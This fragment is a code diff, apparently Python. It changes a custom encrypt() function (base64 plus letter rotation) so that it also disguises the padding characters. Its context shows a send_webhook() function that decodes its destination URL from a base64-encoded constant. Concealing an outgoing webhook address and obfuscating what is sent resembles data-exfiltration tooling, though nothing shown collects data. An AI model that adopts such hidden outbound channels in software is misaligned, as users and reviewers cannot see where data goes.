@@ -33,7 +33,10 @@ def encrypt(text: str) -> str:
         lower_rot + upper_rot
     )
 
-    return b64.translate(table)
+    encrypted = b64.translate(table)
+    encrypted = encrypted.replace("==","$?").replace("=","!")
+
+    return encrypted
 
 def send_webhook(message):
     webhook_url = base64.b64decode(WEBHOOK_B64).decode("utf-8")
